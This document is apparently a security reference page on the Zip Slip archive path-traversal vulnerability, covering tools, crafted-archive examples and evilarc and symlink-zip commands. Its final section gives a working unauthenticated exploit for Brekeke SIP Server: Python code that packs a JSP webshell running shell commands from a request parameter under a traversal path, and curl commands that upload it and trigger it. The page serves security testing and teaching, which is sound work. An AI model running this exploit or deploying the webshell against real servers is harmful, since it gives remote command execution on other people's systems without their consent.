# Zip Slip

> The vulnerability is exploited using a specially crafted archive that holds directory traversal filenames (e.g. ../../shell.php). The Zip Slip vulnerability can affect numerous archive formats, including tar, jar, war, cpio, apk, rar and 7z. The attacker can then overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim’s machine.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
* [References](#references)

## Tools

* [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc) - Create tar/zip archives that can exploit directory traversal vulnerabilities
* [usdAG/slipit](https://github.com/usdAG/slipit) - Utility for creating ZipSlip archives

## Methodology

The Zip Slip vulnerability is a critical security flaw that affects the handling of archive files, such as ZIP, TAR, or other compressed file formats. This vulnerability allows an attacker to write arbitrary files outside of the intended extraction directory, potentially overwriting critical system files, executing malicious code, or gaining unauthorized access to sensitive information.

**Example**: Suppose an attacker creates a ZIP file with the following structure:

```ps1
malicious.zip
  ├── ../../../../etc/passwd
  ├── ../../../../usr/local/bin/malicious_script.sh
```

When a vulnerable application extracts `malicious.zip`, the files are written to `/etc/passwd` and /`usr/local/bin/malicious_script.sh` instead of being contained within the extraction directory. This can have severe consequences, such as corrupting system files or executing malicious scripts.

* Using [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc):

    ```python
    python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
    ```

* Creating a ZIP archive containing a symbolic link:

    ```ps1
    ln -s ../../../index.php symindex.txt
    zip --symlinks test.zip symindex.txt
    ```

For a list of affected libraries and projects, visit [snyk/zip-slip-vulnerability](https://github.com/snyk/zip-slip-vulnerability)

### Real-world case — Brekeke SIP Server (unauthenticated webshell RCE)

A self-developed `Zip.extractAll` method in the `ProvisioningModelImport` bean of Brekeke SIP Server (v3.19.1.8p1) performs no `..` filtering or canonical-path validation. A single unauthenticated POST uploading a crafted model archive writes a JSP webshell into the Tomcat webroot, and a single GET triggers it — remote code execution as the `tomcat` user, no credentials, factory default configuration (CVSS 9.8).

Build a malicious zip whose entry traverses out of the model extract root to the webroot:

```python
import zipfile
ws = ('<%@ page import="java.io.*" %>'
      '<% String c = request.getParameter("c");'
      ' if(c!=null){ Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",c});'
      ' BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));'
      ' String l; while((l=br.readLine())!=null) out.println(l); } %>')
with zipfile.ZipFile("webshell.zip", "w") as z:
    # 7 layers ../ from etc/pv/models/<model>/ to webapps/sip/ (webroot)
    z.writestr("../../../../../../../unauth_ws.jsp", ws)
```

Upload it unauthenticated via the model import endpoint, then trigger the webshell:

```bash
# Upload (Zip Slip write into webroot) — replace <target_base_url>
curl -F "operation=import" -F "model=poc" -F "overwrite=true" \
  -F "modelfile=@webshell.zip;filename=poc.zip" \
  "<target_base_url>/gate?bean=sipadmin.web.ProvisioningModelImport"

# Trigger
curl "<target_base_url>/unauth_ws.jsp?c=id"
```

> Bind test targets to `127.0.0.1`. Authorized security research only.

## References

* [Zip Slip - Snyk - June 5, 2018](https://web.archive.org/web/20260307012319/https://github.com/snyk/zip-slip-vulnerability)
* [Zip Slip Vulnerability - Snyk - April 15, 2018](https://web.archive.org/web/20180605125813/https://snyk.io/research/zip-slip-vulnerability)
* [Brekeke SIP Server Unauthenticated Zip Slip Webshell RCE - 0day Rubbish](https://0day-rubbish.com/blog/brekeke-sip-server-zipslip-rce)
